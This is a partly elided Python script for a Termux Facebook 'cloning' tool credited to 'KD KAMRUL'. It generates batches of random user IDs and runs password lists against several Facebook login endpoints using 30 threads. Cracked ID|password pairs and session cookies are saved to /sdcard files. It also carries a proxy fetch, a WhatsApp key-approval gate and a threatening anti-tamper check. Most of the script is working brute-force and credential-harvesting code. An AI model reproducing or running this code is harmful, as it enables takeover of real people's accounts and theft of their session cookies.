...
try:
	...
	os.system('python KAMRUL.py')
	
print('[•] Join messenger Group')
os.system('xdg-open https://m.me/j/AbZ-kzGKC1niOupz/')

try:
	prox= requests.get('https://github.com/KAMRUL-509/kamrul-on-fire/blob/main/proxies.txt').text
...
\033[1;34m║AUTHOR    : KD KAMRUL             ║║       \x1b[1;91m|__-__|\033[1;32m        ║
\033[1;35m║══════════════════════════════════║║       \x1b[1;91m/| []|'\033[1;32m        ║
\033[1;36m║WHATSAPP  : +8801603723934           ║║     \x1b[1;91m()/|___|\()\033[1;32m      ║
\033[1;37m║══════════════════════════════════║║        \x1b[1;91m|_|_|\033[1;32m         ║
\033[1;38m║GITHUB    : KAMRUL-509           ║║       \x1b[1;91m|_| |_|\033[1;32m        ║
\033[1;39m║══════════════════════════════════║║                      ║
\033[1;31m║SERVER    : DATA        WORKING   ║╚══════════════════════╝
\033[1;32m║══════════════════════════════════════════════════════════╗
\033[1;33m║FACEBOOK  : \x1b[1;91h KD KAMRUL ISLAM ║
\033[1;34m║══════════════════════════════════════════════════════════║
\033[1;35m║FACEBOOK GROUP: \x1b[1;91KAMRUL TERMUX WORLD \033[1;32m ║
\033[1;36m╚══════════════════════════════════════════════════════════╝\033[1;37m""") 
...
def pak():
		...
		for nmbr in range(limit):
			...
			user.append(nmp)
		with tred(max_workers=30) as KAMRUL:	
			clear()
			tl = str(len(user))
			...
			for psx in user:
				...
				if mthd in ['1','01']:
					KAMRUL.submit(KAMRUL1,ids,passlist)
				if mthd in ['2','02']:
					KAMRUL.submit(KAMRUL2,ids,passlist)
				if mthd in ['3','03']:
					KAMRUL.submit(KAMRUL3,ids,passlist)
				if mthd in ['4','04']:
					KAMRUL.submit(KAMRUL4,ids,passlist)
				if mthd in ['5','05']:
					KAMRUL.submit(KAMRUL5,ids,passlist)
				if mthd in ['6','06']:
					KAMRUL.submit(KAMRUL6,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def api1(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;37m [KAMRUL-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;32m [KAMRUL-OK] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/KAMRUL-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\x1b[38;5;205m [KAMRUL-CP] '+ids+' | '+pas+'\033[1;97m')
						open('/sdcard/KAMRUL-CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/KAMRUL-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [KAMRUL-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/KAMRUL-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/KAMRUL-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[KAMRUL-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [KAMRUL-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
"Content-Length": "329",}
                        ...
                        if 'session_key' in po:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        open('/sdcard/KAMRUL-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/KAMRUL-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
...
def api4(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [KAMRUL-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;206m [KAMRUL-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/KAMRUL-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
...
def api5(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [KAMRUL-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api6(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [KAMRUL-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			KAMRUL=session.cookies.get_dict().keys()
			if "c_user" in KAMRUL:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\r\r\033[1;32m [KAMRUL-OK] %s | %s'%(ids,pas))
				open('/sdcard/KAMRUL-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in KAMRUL:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;205m [KAMRUL-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/KAMRUL-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
...
def api7(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [KAMRUL-M7] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
def api8(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [KAMRUL-M8] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
'Content-Length': '698'}
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [KAMRUL-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/KAMRUL-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;205m [KAMRUL-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/KAMRUL-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def KAMRUL2(ids,passlist):
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [KAMRUL-OK] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/KAMRUL-rnd-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'www.facebook.com' in q['error_msg']:
				print('\r\r\x1b[38;5;205m [KAMRUL-CP] '+ids+' | '+pas+'\033[1;97m')
				open('/sdcard/KAMRUL-rnd-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:
				continue
...
def KAMRUL3(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        #open('/sdcard/KAMRUL-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/KAMRUL-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                ...
                pass
#method4
def KAMRUL4(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [KAMRUL-M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [KAMRUL-2F] '+uid+' | '+pas)
					else:
						print(f'\r\x1b[1;32m [KAMRUL-OK] '+uid+' | '+pas)
						#cek_apk(session,coki)
						open('/sdcard/KAMRUL-rnd-OK.txt', 'a').write(uid+'|'+pas+'\n')
						oks.append(uid)
						break
				...
				if uid in cps:pass
					...
					print('\r\r\x1b[38;5;205m [KAMRUL-CP] '+uid+' | '+pas+'\033[1;97m')
					open('/sdcard/KAMRUL-rnd-CP.txt', 'a').write(uid+'|'+pas+'\n')
					cps.append(ids)
					break
			else:
				continue
...
if not str(len(open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py','r').readlines()))=='1034':
	time.sleep(0);print('Final Warning If You Try Again Your System Will be Fucked Bye Mr KAMRUL');exit()
try:
	import pyrebase
except:
...
def approval():
 ...
 #     print(" Easypaisa  Number     : +923118933642")
  #    print(" Trust Wallet Address : 0xb785952B2825366c8756fb65520F7Df8e0D145bD")
      ...
      tks = ('Hello%20MR-KAMRUL%20Sir%20!%20Please%20Approve%20My%20Key%20The%20KAMRUL%20Key%20Is%20:%20'+id);os.system('am start https://wa.me/+923309580245?text='+tks)
      time.sleep(1)
      approval()
  except:
    sys.exit()
